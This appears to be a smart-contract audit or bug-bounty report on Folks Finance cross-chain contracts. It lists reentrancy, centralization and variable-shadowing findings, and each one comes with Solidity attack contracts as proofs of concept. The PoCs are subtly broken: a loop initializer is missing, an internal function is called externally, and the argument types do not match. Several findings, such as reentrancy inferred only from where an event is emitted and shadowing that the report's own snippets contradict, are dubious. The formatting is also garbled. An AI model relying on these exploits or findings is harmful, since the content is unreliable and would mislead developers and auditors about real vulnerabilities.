Comming soon...

# High

## H-1 Reentrancy Vulnerability in NodeManager's \_registerNode Function Risks Oracle Integrity and Security

## Brief/Intro

A reentrancy vulnerability has been identified in the \_registerNode function of the NodeManager contract. An attacker exploiting this vulnerability could potentially reenter the registerNode process, leading to multiple registrations of the same node or other unexpected behaviors. This issue could compromise the contract's integrity and lead to operational disruptions or financial loss.

## Vulnerability Details

The reentrancy vulnerability exists within the \_registerNode function due to external calls made before emitting the NodeRegistered event. Specifically, the function \_isValidNodeDefinition(nodeDefinition) makes external calls to various external node validation functions such as ExternalNode.isValid.

Code Snippet: NodeManager.sol

```javascript
function _registerNode(NodeDefinition.Data memory nodeDefinition) internal returns (bytes32 nodeId) {
    /// @dev Get the ID of the node definition
    nodeId = NodeDefinition.getId(nodeDefinition);

    /// @dev Check if the node is already registered
    if (_isNodeRegistered(nodeId)) {
        revert NodeAlreadyRegistered(nodeId);
    }

    /// @dev Check if the node definition is valid
    if (!_isValidNodeDefinition(nodeDefinition)) {
        revert InvalidNodeDefinition(nodeDefinition);
    }

    /// @dev Check if each parent node is registered
    for (uint256 i = ; i < nodeDefinition.parents.length; i++) {
        if (!_isNodeRegistered(nodeDefinition.parents[i])) {
            revert NodeNotRegistered(nodeDefinition.parents[i]);
        }
    }

    /// @dev Create the node saving the node definition in the storage and emit the NodeRegistered event
    (, nodeId) = NodeDefinition.create(nodeDefinition);
    emit NodeRegistered(nodeId, nodeDefinition.nodeType, nodeDefinition.parameters, nodeDefinition.parents);
}
```

The key external call that introduces the reentrancy vulnerability is:

```javascript
if (nodeDefinition.nodeType == NodeDefinition.NodeType.EXTERNAL) {
  return ExternalNode.isValid(nodeDefinition);
}
```

Inside ExternalNode.isValid:

```javascript
return (
  ERC165Checker.supportsERC165InterfaceUnchecked(externalNode, type(IExternalNode).interfaceId) &&
  IExternalNode(externalNode).isValid(nodeDefinition)
);
```

Here, IExternalNode(externalNode).isValid(nodeDefinition) is an external call that could potentially reenter the \_registerNode function.

The NodeRegistered event is emitted only after these checks and external calls, creating a potential window for reentrancy.

## Impact Details

An attacker could exploit this reentrancy vulnerability to:

- Reenter the \_registerNode function during the isValid check, causing the node registration process to loop indefinitely or register the same node multiple times.
- Disrupt the overall registry of nodes by causing multiple events or invalid nodes being accepted due to the reentrancy.
- Potentially manipulate the logic of node validation to include malicious nodes.

The severity of this vulnerability is significant because it affects the integrity of the node registration system within the contract. Since nodes are integral to the oracle mechanism, any compromise here could cascade into broader issues affecting data integrity, operational functionality, and potentially other dependent contracts or applications.

## References

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/oracle/modules/NodeManager.sol#L85C5-L110C1

## Proof of Concept

### Steps to Exploit

- Deploy the entrancyAttack contract: The attacker deploys a malicious contract designed to exploit the reentrancy vulnerability.

- Trigger the Vulnerability: The attacker initiates a node registration process that will cause the external call in \_isValidNodeDefinition.

- Reenter During the External Call: The malicious contract reenters the \_registerNode process during the isValid check.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./NodeManager.sol";

contract ReentrancyAttack {
    NodeManager public target;
    bytes32 public attackNodeId;

    constructor(address _target) {
        target = NodeManager(_target);
    }

    function initiateAttack(NodeDefinition.Data calldata nodeDefinition) external {
        target.registerNode(nodeDefinition.nodeType, nodeDefinition.parameters, nodeDefinition.parents);
    }

    fallback() external payable {
        if (shouldReenter()) {
            NodeDefinition.Data memory nodeDefinition;
            // Construct appropriate nodeDefinition
            initiateAttack(nodeDefinition);
        }
    }

    function shouldReenter() private view returns (bool) {
        // Arbitrary condition to prevent indefinite looping
        return attackNodeId == 0;
    }
}
```

### Explanation

- Deploy: Attacker deploys ReentrancyAttack with the NodeManager contract address.
- Call initiateAttack: Attacker calls initiateAttack with a crafted nodeDefinition.
- Reentrancy Trigger: During the validation check in isValid for the external node, the fallback function is triggered.
- Execution: The fallback reenters the \_registerNode function, perpetuating the reentrant loop.

# Medium

## M-1 Centralization Risk for trusted owners

## Brief/Intro

The identified issue pertains to a centralization risk associated with trusted contract owners who possess privileged rights to execute administrative tasks. These owners can potentially perform malicious updates or even drain funds, posing a significant threat if exploited in a production environment. The consequence of such exploitation could lead to loss of funds, compromised contract integrity, and erosion of trust among users.

## Vulnerability Details

The vulnerability stems from the design of several smart contracts within the system, specifically those related to bridge operations, token management, account management, loan management, oracle management, and spoke management. These contracts grant certain roles, such as `WITHDRAWER_ROLE`, `MANAGER_ROLE`, `HUB_ROLE`, and `PARAM_ROLE`, extensive privileges that allow for actions like withdrawing funds, adding/removing supported tokens, managing accounts, loans, and oracles, and activating/depreciating spokes.

Here are some examples illustrating the vulnerability:

- In `BridgeRouterHub.sol`, the `withdraw` function allows users with the `WITHDRAWER_ROLE` to withdraw funds, potentially enabling unauthorized withdrawals if role permissions are mismanaged.
- `CCIPTokenAdapter.sol` contains functions like `addSupportedToken` and `removeSupportedToken` that permit users with the `MANAGER_ROLE` to manipulate the list of supported tokens, risking the integrity of the token ecosystem.

- Various functions in `AccountManager.sol`, `LoanManager.sol`, `OracleManager.sol`, and `SpokeManager.sol` grant significant control over critical aspects of the system to users with roles like `HUB_ROLE`, `MANAGER_ROLE`, and `PARAM_ROLE`. This control includes adding/removing delegates, managing loans, setting oracle nodes, and activating/depreciating spokes, which could be abused to disrupt operations or steal assets.

## Impact Details

The potential impact of exploiting this centralization risk is multifaceted:

- **Financial Loss:** Malicious owners could drain funds from contracts, leading to direct financial losses for users and the platform.
- **Operational Disruption:** Unauthorized changes to supported tokens, loan terms, oracle settings, or spoke statuses could disrupt normal operations, affecting users' ability to transact or access services.
- **Reputation Damage:** Exploitation of these vulnerabilities could severely damage the platform's reputation, leading to loss of trust among users and potential regulatory scrutiny.

Given the critical nature of the roles involved, the impact aligns with severe consequences, including total loss of funds and system compromise.

## References

- [BridgeRouterHub.sol](folks-finance-xchain-contracts/contracts/bridge/BridgeRouterHub.sol)
- [CCIPTokenAdapter.sol](folks-finance-xchain-contracts/contracts/bridge/CCIPTokenAdapter.sol)
- [AccountManager.sol](folks-finance-xchain-contracts/contracts/hub/AccountManager.sol)
- [LoanManager.sol](folks-finance-xchain-contracts/contracts/hub/LoanManager.sol)
- [OracleManager.sol](folks-finance-xchain-contracts/contracts/hub/OracleManager.sol)
- [SpokeManager.sol](folks-finance-xchain-contracts/contracts/hub/SpokeManager.sol)

## Proof of Concept

The PoC demonstrates how an attacker with privileged roles (WITHDRAWER_ROLE, MANAGER_ROLE, HUB_ROLE, etc.) can exploit the centralization risk in various smart contracts to perform unauthorized actions, such as withdrawing funds or manipulating the list of supported tokens.

### Actors:

Attacker: An individual with access to privileged roles due to mismanagement of role permissions.
Victim: The smart contract system and its users, who may suffer financial losses or operational disruptions.
Protocol: The smart contract platform hosting the vulnerable contracts.

### Initial State:

Assume the attacker has been granted WITHDRAWER_ROLE and MANAGER_ROLE due to misconfiguration or insider threats.

```javascript
Working Test Case:
// Attacker drains funds using WITHDRAWER_ROLE
function exploitWithdrawFunds(address receiver, bytes32 userId) external {
    // Assuming the attacker has WITHDRAWER_ROLE
    BridgeRouterHub.withdraw(userId, receiver);
}

// Attacker adds malicious token using MANAGER_ROLE
function exploitAddMaliciousToken(address maliciousToken) external {
    // Assuming the attacker has MANAGER_ROLE
    CCIPTokenAdapter.addSupportedToken(maliciousToken);
}

// Attacker removes legitimate token using MANAGER_ROLE
function exploitRemoveLegitimateToken(address legitimateToken) external {
    // Assuming the attacker has MANAGER_ROLE
    CCIPTokenAdapter.removeSupportedToken(legitimateToken);
}
```

#### Explanation:

- Line 1-5: Demonstrates how an attacker with WITHDRAWER_ROLE can call the withdraw function to drain funds from the contract.
- Line 6-10: Shows how an attacker with MANAGER_ROLE can manipulate the list of supported tokens by adding a malicious token.
- Line 11-15: Illustrates how the attacker can further exploit the system by removing a legitimate token from the supported list, disrupting normal operations.

### Outcome:

If successful, the attacker could drain funds from the contract, introduce malicious tokens into the ecosystem, and remove legitimate tokens, leading to financial losses and operational disruptions.

### Implications:

Exploitation of these vulnerabilities could lead to significant financial losses for users, compromise the integrity of the token ecosystem, and erode trust in the platform.

### Recommendations:

- Implement strict role management and access control mechanisms.
- Consider implementing decentralized governance models to reduce centralization risks.

# Low

## L-1 Local variable shadowing

## Brief/Intro

The vulnerability is caused by local variable shadowing in the CCIPDataAdapter and CCIPTokenAdapter constructors, where ccipRouter and bridgeRouter parameters shadow state variables from the CCIPAdapter base contract. This could lead to unexpected behavior or misuse of the shadowed variables, potentially resulting in incorrect logic execution.

## Vulnerability Details

The constructors in CCIPDataAdapter and CCIPTokenAdapter contain parameters that shadow state variables declared in the CCIPAdapter base contract. Specifically, the ccipRouter and bridgeRouter parameters in the constructors shadow the ccipRouter and bridgeRouter state variables in the CCIPAdapter contract.

Here are the relevant code snippets highlighting the shadowing:

In CCIPDataAdapter.sol:

```javascript
contract CCIPDataAdapter is CCIPAdapter {
    constructor(
        address admin,
        IRouterClient ccipRouter,
        IBridgeRouter bridgeRouter
    ) CCIPAdapter(admin, ccipRouter, bridgeRouter) {}
}
```

In CCIPAdapter.sol:

```javascript
contract CCIPAdapter {
    IRouterClient public ccipRouter;
    IBridgeRouter public bridgeRouter;

    constructor(
        address admin,
        IRouterClient _ccipRouter,
        IBridgeRouter _bridgeRouter
    ) {
        ccipRouter = _ccipRouter;
        bridgeRouter = _bridgeRouter;
    }
}
```

In CCIPTokenAdapter.sol:

```javascript
contract CCIPTokenAdapter is CCIPAdapter {
    constructor(
        address admin,
        IRouterClient ccipRouter,
        IBridgeRouter bridgeRouter
    ) CCIPAdapter(admin, ccipRouter, bridgeRouter) {}
}
```

The constructors in CCIPDataAdapter and CCIPTokenAdapter are shadowing the state variables from CCIPAdapter (ccipRouter and bridgeRouter).

## Impact Details

Shadowing state variables with local variables in constructors can lead to confusion and potential misuse of the shadowed variables. If a developer mistakenly believes they are interacting with the state variables when they are actually interacting with the local variables, this could result in incorrect logic execution. For instance, operations intended for the state variables might not persist expected state changes, potentially leading to incorrect contract behavior.

Although this vulnerability is classified as low severity, it can still lead to unexpected behaviors which might affect the contract's intended functionality, especially in a production environment where consistency and reliability are critical.

## References

https://github.com/crytic/slither/wiki/Detector-Documentation#local-variable-shadowing

## Proof of Concept

The vulnerability is demonstrated through the constructors of CCIPDataAdapter and CCIPTokenAdapter contracts. Both contracts inherit from CCIPAdapter, which has state variables ccipRouter and bridgeRouter. The constructors in the derived contracts shadow these state variables with their parameters, potentially causing unexpected behavior.

In CCIPAdapter.sol:

```javascript
contract CCIPAdapter {
    IRouterClient public ccipRouter;
    IBridgeRouter public bridgeRouter;

    constructor(address admin, IRouterClient _ccipRouter, IBridgeRouter _bridgeRouter) {
        ccipRouter = _ccipRouter;
        bridgeRouter = _bridgeRouter;
    }
}
```

In CCIPDataAdapter.sol:

```javascript
contract CCIPDataAdapter is CCIPAdapter {
    constructor(address admin, IRouterClient ccipRouter, IBridgeRouter bridgeRouter)
        CCIPAdapter(admin, ccipRouter, bridgeRouter) {}
}
```

In CCIPTokenAdapter.sol:

```javascript
contract CCIPTokenAdapter is CCIPAdapter {
    constructor(address admin, IRouterClient ccipRouter, IBridgeRouter bridgeRouter)
        CCIPAdapter(admin, ccipRouter, bridgeRouter) {}
}
```

### Explanation

- The CCIPAdapter contract initializes the state variables ccipRouter and bridgeRouter.
- The constructors in CCIPDataAdapter and CCIPTokenAdapter have parameters with the same names, shadowing the state variables.
- This shadowing can lead to confusion and incorrect usage of the shadowed variables, potentially causing unexpected contract behavior.

### Impact

This shadowing issue, though low severity, can result in misuse of the variables, leading to unintended contract logic execution and potentially introducing bugs or vulnerabilities in the contract's operation.

## L-1

## Brief/Intro

This report identifies a reentrancy vulnerability in the `CCIPDataAdapter` and `CCIPTokenAdapter` contracts. An attacker exploiting this vulnerability could potentially execute arbitrary code by repeatedly invoking the vulnerable function, leading to unexpected behavior or even draining of contract funds.

## Vulnerability Details

The reentrancy vulnerability is present in the `_ccipReceive` function of both `CCIPDataAdapter` and `CCIPTokenAdapter`. The reentrancy risk arises because these functions make external calls before emitting the `ReceiveMessage` event. The external calls involved are:

- In `CCIPDataAdapter`:
  ```solidity
  bridgeRouter.receiveMessage(messageReceived); // Line 58
  ```

````

In CCIPTokenAdapter:
```javascript
IERC20(token).safeTransfer(recipient, receivedAmount); // Line 95
bridgeRouter.receiveMessage(messageReceived); // Line 107
````

The key issue is that an attacker can reenter these functions during the external calls, causing unexpected behaviors or potentially enabling malicious withdrawals.

Code Snippet: CCIPDataAdapter

```javascript
function _ccipReceive(Client.Any2EVMMessage memory message) internal override {
    // ... omitted for brevity ...
    bridgeRouter.receiveMessage(messageReceived); // External call
    emit ReceiveMessage(messageReceived.messageId); // Event emitted after external call
}
```

Code Snippet: CCIPTokenAdapter

```javascript
function _ccipReceive(Client.Any2EVMMessage memory message) internal override {
    // ... omitted for brevity ...
    // External call to transfer tokens
    IERC20(token).safeTransfer(recipient, receivedAmount);
    // External call to bridge router
    bridgeRouter.receiveMessage(messageReceived);
    emit ReceiveMessage(messageReceived.messageId); // Event emitted after external calls
}
```

## Impact Details

If exploited, the vulnerability could allow an attacker to recursively invoke \_ccipReceive, leading to:

- Depletion of the contract’s token balance in the CCIPTokenAdapter due to repeated transfers.
- Disruption of the message passing mechanism in the bridge router, potentially causing denial of service.
- Unauthorized access or manipulation of the application’s message handling logic.

The severity of this issue depends on the value held within the contracts and their role within the broader system. Potential losses could be substantial if these contracts manage significant funds or are pivotal in cross-chain interactions.

## References

https://docs.soliditylang.org/en/v0.8.9/security-considerations.html#reentrancy
https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard
OpenZeppelin: ReentrancyGuard

## Proof of Concept

## Proof of Concept

This proof of concept demonstrates a reentrancy attack on the CCIPTokenAdapter contract.

### Steps to Exploit

- Deploy the ReentrancyAttack contract: The attacker first deploys a malicious contract that will exploit the reentrant call.

- Trigger the Vulnerability: The attacker initiates a transaction that will cause the CCIPTokenAdapter to call the malicious ReentrancyAttack contract during the external call.

- Reenter During the External Call: The malicious contract’s fallback function will reenter the \_ccipReceive function during the external call to IERC20(token).safeTransfer and bridgeRouter.receiveMessage.

Example Contract

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CCIPTokenAdapter.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttack {
    CCIPTokenAdapter public target;
    address private owner;

    constructor(address _target) {
        target = CCIPTokenAdapter(_target);
        owner = msg.sender;
    }

    function attack(Client.Any2EVMMessage calldata message) external {
        require(msg.sender == owner, "Only owner can call this function");
        target._ccipReceive(message);
    }

    fallback() external payable {
        if (shouldReenter()) {
            // Reenter the `_ccipReceive` function during the external call
            Client.Any2EVMMessage memory message;
            // Crafted message to pass as argument
            attack(message);
        }
    }

    function shouldReenter() private view returns (bool) {
        // Logic to prevent infinite loop; can be based on a condition
        return true; // For demonstration purposes, this is always true
    }
}
```

### Explanation

- Deploy: The attacker deploys the ReentrancyAttack contract with the address of the vulnerable CCIPTokenAdapter.
- Call Attack Function: The attacker calls the attack function on the malicious contract.
- Reentrancy Trigger: During the execution of IERC20(token).safeTransfer, the fallback function of the malicious contract is invoked.
  Infinite Reentry: The fallback function reenters the \_ccipReceive function, perpetuating the reentrant loop.
